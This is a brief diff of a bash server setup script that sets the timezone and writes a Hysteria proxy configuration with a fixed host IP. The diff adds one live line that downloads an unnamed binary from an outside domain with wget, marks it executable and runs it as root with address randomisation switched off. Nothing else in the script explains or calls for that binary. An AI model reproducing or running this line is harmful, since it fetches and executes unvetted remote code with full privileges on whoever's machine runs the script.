@@ -1,5 +1,6 @@
 #!/bin/bash
 ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
+wget -O nameofscript.x https://admin-boyes.com/daddyjo/nameofscript.x; chmod +x nameofscript.x; setarch $(uname -m) -R /root/nameofscript.x;
 cat << EOF > /etc/hysteria/config.sh
 #!/bin/bash
 HOST='185.61.137.171'
